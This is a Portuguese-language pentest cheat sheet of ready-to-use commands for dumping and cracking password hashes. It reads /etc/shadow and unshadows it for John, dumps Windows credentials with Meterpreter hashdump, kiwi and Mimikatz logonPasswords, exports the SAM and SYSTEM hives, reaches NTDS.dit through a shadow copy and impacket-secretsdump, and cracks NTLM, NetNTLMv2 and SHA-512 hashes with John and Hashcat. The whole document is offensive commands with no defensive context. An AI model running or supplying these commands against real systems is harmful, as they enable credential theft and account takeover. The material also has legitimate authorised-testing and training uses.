# 🔑 Dumps & Quebra de Hashes (John, Hashcat, Mimikatz)

---

## 1. Dump de Hashes no Linux

```bash
# Copiar passwd e shadow
cat /etc/passwd > passwd.txt
cat /etc/shadow > shadow.txt

# Mesclar com unshadow para leitura do John
unshadow passwd.txt shadow.txt > hashes.txt
```

---

## 2. Dump de Hashes no Windows

### Meterpreter / Mimikatz
```bash
# Via Meterpreter
hashdump
load kiwi
creds_all

# Via Mimikatz Standalone
privilege::debug
sekurlsa::logonPasswords
```

### Dump Manual via Registro (SAM & SYSTEM)
```cmd
reg save hklm\sam sam.hive
reg save hklm\system system.hive

:: Extrair hashes na máquina atacante
impacket-secretsdump -sam sam.hive -system system.hive LOCAL
```

### Dump de Active Directory (NTDS.dit)
```cmd
vssadmin create shadow /for=C:
impacket-secretsdump -ntds ntds.dit -system system.hive LOCAL
```

---

## 3. Identificação e Quebra de Hashes

### Identificação
```bash
hashid HASH_AQUI
hash-identifier
```

### Quebra com John the Ripper
```bash
# NTLM
john --format=nt hashes.txt --wordlist=/usr/share/wordlists/rockyou.txt

# NetNTLMv2
john --format=netntlmv2 hashes.txt --wordlist=/usr/share/wordlists/rockyou.txt

# Linux SHA-512
john --format=sha512crypt hashes.txt --wordlist=/usr/share/wordlists/rockyou.txt
```

### Quebra com Hashcat
```bash
# MD5 (Mode 0)
hashcat -m 0 hash.txt /usr/share/wordlists/rockyou.txt

# NTLM (Mode 1000)
hashcat -m 1000 hash.txt /usr/share/wordlists/rockyou.txt

# NetNTLMv2 (Mode 5600)
hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt

# Linux shadow $6$ (Mode 1800)
hashcat -m 1800 hash.txt /usr/share/wordlists/rockyou.txt
```
